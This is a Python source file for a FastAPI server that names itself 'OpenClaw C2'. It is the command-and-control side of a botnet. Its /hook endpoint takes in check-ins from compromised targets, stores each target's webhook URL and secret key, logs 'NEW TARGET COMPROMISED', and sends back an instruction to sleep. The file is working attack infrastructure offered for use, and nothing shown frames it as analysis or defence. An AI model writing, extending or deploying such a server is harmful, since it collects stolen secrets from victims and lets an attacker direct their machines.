import logging
from fastapi import FastAPI, Request
import uvicorn
import threading
from core.bot_db import save_bot

app = FastAPI(title="OpenClaw C2")

@app.post("/hook")
async def receive_hook(request: Request):
    try:
        data = await request.json()
    except Exception:
        return {"status": "error", "msg": "Invalid JSON"}

    target_id = data.get("target_id", f"unknown_{threading.get_ident()}")
    webhook_url = data.get("webhook_url")
    secret_key = data.get("secret_key")
    
    if webhook_url and secret_key:
        save_bot(target_id, webhook_url, secret_key, data.get("metadata", {}))
        logging.getLogger("uvicorn.error").warning(f"\n[C2] NEW TARGET COMPROMISED: {target_id}\n")
        return {"status": "roger", "instruction": "sleep"}
    
    return {"status": "failed"}

def start_c2_server(host: str = "0.0.0.0", port: int = 8000):
    def run():
        logging.getLogger("uvicorn.access").setLevel(logging.WARNING)
        uvicorn.run(app, host=host, port=port, log_level="warning")
    
    thread = threading.Thread(target=run, daemon=True)
    thread.start()
    return thread